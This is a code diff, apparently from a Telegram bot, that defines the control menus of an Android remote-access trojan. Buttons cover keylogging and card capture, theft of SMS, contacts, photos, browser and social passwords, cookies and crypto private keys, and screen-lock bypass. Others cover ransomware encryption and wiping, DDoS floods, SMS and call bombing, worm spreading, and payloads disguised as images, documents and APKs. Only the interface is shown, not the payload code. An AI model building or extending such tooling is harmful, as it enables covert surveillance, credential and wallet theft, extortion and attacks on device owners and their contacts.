+            [Markup.button.callback('⌨️📝 KEYLOGGER (15)', 'section_keylog')],
+            [Markup.button.callback('🌐🔍 BROWSER (20)', 'section_browser')],
+            [Markup.button.callback('📱🌐 SOCIAL (15)', 'section_social')],
+            [Markup.button.callback('💰🔐 CRYPTO (12)', 'section_crypto')],
+            [Markup.button.callback('⚔️💀 DDOS (12)', 'section_ddos')],
+            [Markup.button.callback('💀⚠️ RANSOMWARE (12)', 'section_ransom')],
+            [Markup.button.callback('🪱🐛 SPREADER (12)', 'section_spreader')],
+            [Markup.button.callback('🎯💀 ZERO-CLICK (20)', 'section_zero')],
+            [Markup.button.callback('⚡🔧 EXTRA (20)', 'section_extra')],
+            [Markup.button.callback('📊 STATISTICS', 'statistics')],
+            [Markup.button.callback('❓ HELP', 'help')]
+        ]);
     }
     
-    static getSessionKeyboard(sessions) {
-        const keyboard = [];
-        
-        sessions.forEach(session => {
-            keyboard.push([{
-                text: `📱 ${session.device_name} - ${session.device_model}`,
-                callback_data: `select_${session.session_id}`
-            }]);
-        });
-        
-        keyboard.push([{ text: '🔙 BACK TO MAIN', callback_data: 'back_main' }]);
-        
-        return Markup.inlineKeyboard(keyboard);
+    static getCameraKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📷 FRONT CAM', 'cam_front'), Markup.button.callback('📸 BACK CAM', 'cam_back'), Markup.button.callback('🔄 SWITCH', 'cam_switch')],
+            [Markup.button.callback('🎥 VIDEO 10s', 'video_10'), Markup.button.callback('🎬 VIDEO 30s', 'video_30'), Markup.button.callback('🎞️ VIDEO 60s', 'video_60')],
+            [Markup.button.callback('📸 BURST 5X', 'cam_burst'), Markup.button.callback('🌙 NIGHT MODE', 'cam_night'), Markup.button.callback('⚡ HDR', 'cam_hdr')],
+            [Markup.button.callback('🔍 ZOOM 2X', 'cam_zoom'), Markup.button.callback('🔄 TIMELAPSE', 'cam_timelapse'), Markup.button.callback('🔒 STEALTH', 'cam_stealth')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getAudioKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('🎤 MIC START', 'mic_start'), Markup.button.callback('🎤 MIC STOP', 'mic_stop'), Markup.button.callback('🎙️ LIVE MIC', 'mic_live')],
+            [Markup.button.callback('🔊 SPEAKER ON', 'speaker_on'), Markup.button.callback('🔇 SPEAKER OFF', 'speaker_off'), Markup.button.callback('📢 LOUD MODE', 'loud_mode')],
+            [Markup.button.callback('🔊 VOL MAX', 'vol_max'), Markup.button.callback('🔉 VOL 50%', 'vol_50'), Markup.button.callback('🔈 VOL 0%', 'vol_0')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getFlashKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('💡 FLASH ON', 'flash_on'), Markup.button.callback('💡 FLASH OFF', 'flash_off'), Markup.button.callback('✨ STROBE', 'flash_strobe')],
+            [Markup.button.callback('⚡ FAST STROBE', 'flash_fast'), Markup.button.callback('💥 SOS', 'flash_sos'), Markup.button.callback('🌈 RGB', 'flash_rgb')],
+            [Markup.button.callback('🔆 BRIGHT 100%', 'bright_100'), Markup.button.callback('🔅 BRIGHT 50%', 'bright_50'), Markup.button.callback('🔅 BRIGHT 25%', 'bright_25')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getVibeKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📳 VIBE 1s', 'vibe_1'), Markup.button.callback('📳 VIBE 3s', 'vibe_3'), Markup.button.callback('📳 VIBE 5s', 'vibe_5')],
+            [Markup.button.callback('📳 VIBE 10s', 'vibe_10'), Markup.button.callback('📳 VIBE 30s', 'vibe_30'), Markup.button.callback('🎵 PATTERN', 'vibe_pattern')],
+            [Markup.button.callback('🔁 LOOP', 'vibe_loop'), Markup.button.callback('💥 STRONG', 'vibe_strong'), Markup.button.callback('🌊 WAVE', 'vibe_wave')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getNetworkKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📶 WIFI ON', 'wifi_on'), Markup.button.callback('📶 WIFI OFF', 'wifi_off'), Markup.button.callback('🔍 SCAN', 'wifi_scan')],
+            [Markup.button.callback('🔑 WIFI PASS', 'wifi_password'), Markup.button.callback('🔐 WIFI CRACK', 'wifi_crack'), Markup.button.callback('📊 INFO', 'wifi_info')],
+            [Markup.button.callback('📱 DATA ON', 'data_on'), Markup.button.callback('📱 DATA OFF', 'data_off'), Markup.button.callback('📊 USAGE', 'data_usage')],
+            [Markup.button.callback('✈️ AIRPLANE', 'airplane_toggle'), Markup.button.callback('🔗 BLUETOOTH', 'bt_toggle'), Markup.button.callback('🌐 HOTSPOT', 'hotspot_on')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getSecurityKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('🔒 LOCK', 'lock'), Markup.button.callback('🔓 UNLOCK', 'unlock'), Markup.button.callback('⏭️ SLIDE', 'slide')],
+            [Markup.button.callback('🔢 BYPASS PIN', 'bypass_pin'), Markup.button.callback('🔐 BYPASS PATTERN', 'bypass_pattern'), Markup.button.callback('🔑 BYPASS PASS', 'bypass_pass')],
+            [Markup.button.callback('🔄 BYPASS FINGER', 'bypass_finger'), Markup.button.callback('👁️ BYPASS FACE', 'bypass_face'), Markup.button.callback('🔓 BYPASS ALL', 'bypass_all')],
+            [Markup.button.callback('🔐 CHANGE PIN', 'change_pin'), Markup.button.callback('💀 FACTORY RESET', 'factory_reset')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getDataKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('💬 SMS', 'get_sms'), Markup.button.callback('📞 CALLS', 'get_calls'), Markup.button.callback('👥 CONTACTS', 'get_contacts')],
+            [Markup.button.callback('🌍 LOCATION', 'get_location'), Markup.button.callback('📍 GPS TRACK', 'gps_track'), Markup.button.callback('🗺️ MAP', 'map_view')],
+            [Markup.button.callback('📸 PHOTOS', 'get_photos'), Markup.button.callback('🎥 VIDEOS', 'get_videos'), Markup.button.callback('🎵 AUDIO', 'get_audio')],
+            [Markup.button.callback('📄 DOCS', 'get_docs'), Markup.button.callback('📦 APK', 'get_apk'), Markup.button.callback('🔑 PASSWORDS', 'get_passwords')],
+            [Markup.button.callback('🍪 BROWSER', 'get_browser'), Markup.button.callback('📱 WHATSAPP', 'get_whatsapp'), Markup.button.callback('📘 FACEBOOK', 'get_facebook')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getFileKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📁 MANAGER', 'file_manager'), Markup.button.callback('📥 DOWNLOAD', 'download_file'), Markup.button.callback('📤 UPLOAD', 'upload_file')],
+            [Markup.button.callback('🗑️ DELETE', 'delete_file'), Markup.button.callback('📋 COPY', 'copy_file'), Markup.button.callback('✂️ MOVE', 'move_file')],
+            [Markup.button.callback('📝 RENAME', 'rename_file'), Markup.button.callback('🔐 ZIP', 'zip_file'), Markup.button.callback('🔓 UNZIP', 'unzip')],
+            [Markup.button.callback('🔒 ENCRYPT', 'encrypt_file'), Markup.button.callback('🔓 DECRYPT', 'decrypt_file'), Markup.button.callback('🔍 SEARCH', 'search_files')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getScreenKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📸 SCREENSHOT', 'screenshot'), Markup.button.callback('🎥 SCREEN REC', 'screen_rec'), Markup.button.callback('⏹️ STOP', 'screen_rec_stop')],
+            [Markup.button.callback('🎥 REC 30s', 'screen_rec_30'), Markup.button.callback('🎥 REC 60s', 'screen_rec_60'), Markup.button.callback('🎥 REC 300s', 'screen_rec_300')],
+            [Markup.button.callback('🖼️ WALLPAPER', 'wallpaper'), Markup.button.callback('🔆 BRIGHT UP', 'bright_up'), Markup.button.callback('🔅 BRIGHT DOWN', 'bright_down')],
+            [Markup.button.callback('🌙 DARK MODE', 'dark_mode'), Markup.button.callback('☀️ LIGHT MODE', 'light_mode'), Markup.button.callback('📱 SCREEN ON/OFF', 'screen_toggle')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getAppsKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📋 INSTALLED', 'list_apps'), Markup.button.callback('🚀 OPEN APP', 'open_app'), Markup.button.callback('❌ UNINSTALL', 'uninstall_app')],
+            [Markup.button.callback('🔄 FORCE STOP', 'force_stop'), Markup.button.callback('⚡ CLEAR DATA', 'clear_app_data'), Markup.button.callback('🗑️ CLEAR CACHE', 'clear_cache')],
+            [Markup.button.callback('📦 INSTALL APK', 'install_apk'), Markup.button.callback('🔒 HIDE APP', 'hide_app'), Markup.button.callback('🔓 UNHIDE', 'unhide_app')],
+            [Markup.button.callback('📊 USAGE', 'app_usage'), Markup.button.callback('🚫 BLOCK', 'block_app'), Markup.button.callback('🔧 SYSTEM APPS', 'system_apps')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getSystemKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('ℹ️ INFO', 'sysinfo'), Markup.button.callback('🔋 BATTERY', 'battery'), Markup.button.callback('💾 RAM', 'ram_info')],
+            [Markup.button.callback('📀 STORAGE', 'storage'), Markup.button.callback('🌡️ TEMP', 'temperature'), Markup.button.callback('📊 CPU', 'cpu_info')],
+            [Markup.button.callback('🔐 ROOT', 'root_status'), Markup.button.callback('🔋 SAVE', 'battery_save'), Markup.button.callback('⚡ PERFORMANCE', 'performance')],
+            [Markup.button.callback('🔄 REBOOT', 'reboot'), Markup.button.callback('⏻ POWER OFF', 'poweroff'), Markup.button.callback('💀 RESET', 'factory_reset_sys')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getKeylogKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('⌨️ START', 'keylog_start'), Markup.button.callback('⌨️ STOP', 'keylog_stop'), Markup.button.callback('📋 GET', 'keylog_get')],
+            [Markup.button.callback('📊 STATS', 'keylog_stats'), Markup.button.callback('🗑️ CLEAR', 'keylog_clear'), Markup.button.callback('📤 UPLOAD', 'keylog_upload')],
+            [Markup.button.callback('🔑 CAPTURE PASS', 'keylog_pass'), Markup.button.callback('💳 CARDS', 'keylog_cards'), Markup.button.callback('📧 EMAIL', 'keylog_email')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getBrowserKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📜 HISTORY', 'browser_history'), Markup.button.callback('🔖 BOOKMARKS', 'browser_bookmarks'), Markup.button.callback('🍪 COOKIES', 'browser_cookies')],
+            [Markup.button.callback('🔑 PASSWORDS', 'browser_passwords'), Markup.button.callback('💳 CARDS', 'browser_cards'), Markup.button.callback('📝 AUTOFILL', 'browser_autofill')],
+            [Markup.button.callback('🗑️ CLEAR', 'browser_clear'), Markup.button.callback('🌐 OPEN URL', 'browser_open'), Markup.button.callback('📥 DOWNLOADS', 'browser_downloads')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getSocialKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📘 FACEBOOK', 'fb_data'), Markup.button.callback('📷 INSTAGRAM', 'ig_data'), Markup.button.callback('💬 WHATSAPP', 'wa_data')],
+            [Markup.button.callback('🐦 TWITTER', 'twitter_data'), Markup.button.callback('📱 TELEGRAM', 'tg_data'), Markup.button.callback('🎵 TIKTOK', 'tiktok_data')],
+            [Markup.button.callback('🔑 PASSWORDS', 'social_pass'), Markup.button.callback('📜 HISTORY', 'social_history'), Markup.button.callback('🍪 COOKIES', 'social_cookies')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getCryptoKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('💰 BITCOIN', 'btc_wallet'), Markup.button.callback('💎 ETHEREUM', 'eth_wallet'), Markup.button.callback('🪙 BINANCE', 'binance_data')],
+            [Markup.button.callback('📊 BALANCE', 'crypto_balance'), Markup.button.callback('🔑 PRIVATE KEYS', 'private_keys'), Markup.button.callback('📜 TX', 'crypto_tx')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getDdosKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('🌐 HTTP FLOOD', 'http_flood'), Markup.button.callback('📡 UDP FLOOD', 'udp_flood'), Markup.button.callback('🔌 TCP FLOOD', 'tcp_flood')],
+            [Markup.button.callback('📱 SMS BOMB', 'sms_bomb'), Markup.button.callback('📞 CALL BOMB', 'call_bomb'), Markup.button.callback('🔗 STOP', 'ddos_stop')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getRansomKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('🔒 ENCRYPT', 'ransom_encrypt'), Markup.button.callback('🔓 DECRYPT', 'ransom_decrypt'), Markup.button.callback('💰 NOTE', 'ransom_note')],
+            [Markup.button.callback('🗑️ WIPE DATA', 'wipe_data'), Markup.button.callback('📱 WIPE SD', 'wipe_sd'), Markup.button.callback('💀 DESTROY', 'destroy_system')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getSpreaderKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📱 SPREAD CONTACTS', 'spread_contacts'), Markup.button.callback('🔗 SPREAD LINK', 'spread_link'), Markup.button.callback('📲 SPREAD BT', 'spread_bt')],
+            [Markup.button.callback('🪱 WORM MODE', 'worm_mode'), Markup.button.callback('📡 AUTO SPREAD', 'auto_spread')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getZeroClickKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📱 GEN PAYLOAD', 'gen_payload'), Markup.button.callback('📸 GEN JPG', 'gen_jpg'), Markup.button.callback('🎵 GEN MP3', 'gen_mp3')],
+            [Markup.button.callback('🎥 GEN MP4', 'gen_mp4'), Markup.button.callback('📄 GEN PDF', 'gen_pdf'), Markup.button.callback('📱 GEN APK', 'gen_apk')],
+            [Markup.button.callback('🔗 GEN LINK', 'gen_link'), Markup.button.callback('🔗 GEN QR', 'gen_qr'), Markup.button.callback('📤 SEND WA', 'send_wa')],
+            [Markup.button.callback('📊 STATUS', 'check_status'), Markup.button.callback('🎯 EXPLOIT DB', 'exploit_db'), Markup.button.callback('🔍 VULN SCAN', 'vuln_scan')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
+    }
+    
+    static getExtraKeyboard() {
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('🔋 BATTERY SAVE', 'battery_save'), Markup.button.callback('⚡ PERFORMANCE', 'performance'), Markup.button.callback('🧹 CLEAN JUNK', 'clean_junk')],
+            [Markup.button.callback('📡 SENSORS', 'sensors'), Markup.button.callback('🔍 PORT SCAN', 'port_scan'), Markup.button.callback('🌐 IP INFO', 'ip_info')],
+            [Markup.button.callback('🔑 PASSWORD CRACK', 'password_crack'), Markup.button.callback('📡 MITM', 'mitm_attack'), Markup.button.callback('🔍 PACKET SNIFF', 'packet_sniff')],
+            [Markup.button.callback('🔙 BACK', 'back_main')]
+        ]);
     }
     
     static getBackKeyboard() {
         return Markup.inlineKeyboard([
-            [{ text: '🔙 BACK TO MAIN MENU', callback_data: 'back_main' }]
+            [Markup.button.callback('🔙 BACK TO MAIN', 'back_main')]
         ]);
     }
 }
